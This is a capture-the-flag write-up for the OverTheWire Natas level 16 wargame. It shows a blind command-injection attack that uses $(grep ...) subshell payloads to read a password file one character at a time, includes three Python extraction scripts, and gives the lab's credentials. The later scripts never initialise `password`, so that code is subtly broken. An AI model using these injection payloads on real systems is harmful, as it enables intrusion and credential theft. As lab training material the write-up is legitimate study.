```
Username: natas16
Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
URL:      http://natas16.natas.labs.overthewire.org
```

- this is similar to level 10, but more characters are not allowed: ``/[;|&`\'"]/``
- additionally, the word used for grep is inside "": `"grep -i \"$key\" dictionary.txt"`
- i can use $(...) to interpolate a subshell command into a string and run a command inside the grep command
- so i can do `$(grep n /etc/natas_webpass/natas17)` as input
- with this, if the character i am looking for does not appear in the password, the program outputs all the words in dictionary.txt
- if i find a character present in the password, there will be no output
- to be easier to check for this condition in a script, i can use `$(grep n /etc/natas_webpass/natas17)African`
- this will output the word African if the character i am looking for is not in the password

- first script i used is for finding the characters that are present in the password, thus narrowing the search space
```Python
import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')

u="http://natas16.natas.labs.overthewire.org/"

VALID_CHARS = string.digits + string.ascii_letters

matchingChars = ""

for c in VALID_CHARS:
    payload = "$(grep " + c + " /etc/natas_webpass/natas17)African"
    url = u + "?needle=" + payload + "&submit=Search"

    response = requests.get(url, auth=basicAuth, verify=False)

    if 'African' not in response.text:
        print("Found a valid char : %s" % c)
        matchingChars += c

print("Matching chars: ", matchingChars) 
```
- this gives me: **05789bhjkoqsvwCEFHJLNOT**
- now i need to use these letters to find the password
- now i will make two separate scripts, one for finding the correct order for the characters after `0` and one for the characters before `0`

```Python
import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
u="http://natas16.natas.labs.overthewire.org/"

matchingChars = "05789bhjkoqsvwCEFHJLNOT"

while True:
    for c in matchingChars:
        payload = "$(grep " + password + c + " /etc/natas_webpass/natas17)African"
        url = u + "?needle=" + payload + "&submit=Search"
        response = requests.get(url, auth=basicAuth, verify=False)

        if 'African' not in response.text:
            print("Found a valid char : %s" % (password+c))
            password += c
```
- i run this until it finds no more characters for a few seconds, and then i stop the script
- this finds: **0OC**, this is the end of the password

```Python
import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
u="http://natas16.natas.labs.overthewire.org/"

matchingChars = "05789bhjkoqsvwCEFHJLNOT"

while True:
    for c in matchingChars:
        payload = "$(grep " + c + password + " /etc/natas_webpass/natas17)African"
        url = u + "?needle=" + payload + "&submit=Search"
        response = requests.get(url, auth=basicAuth, verify=False)

        if 'African' not in response.text:
            print("Found a valid char : %s" % (c+password))
            password = c + password
```
- i run this until it finds no more characters for a few seconds, and then i stop the script
- this finds: **EqjHJbo7LFNb8vwhHb9s75hokh5TF**, this is the beginning of the password

- in the end, the password for level 17 is:

# Password

- **EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC**
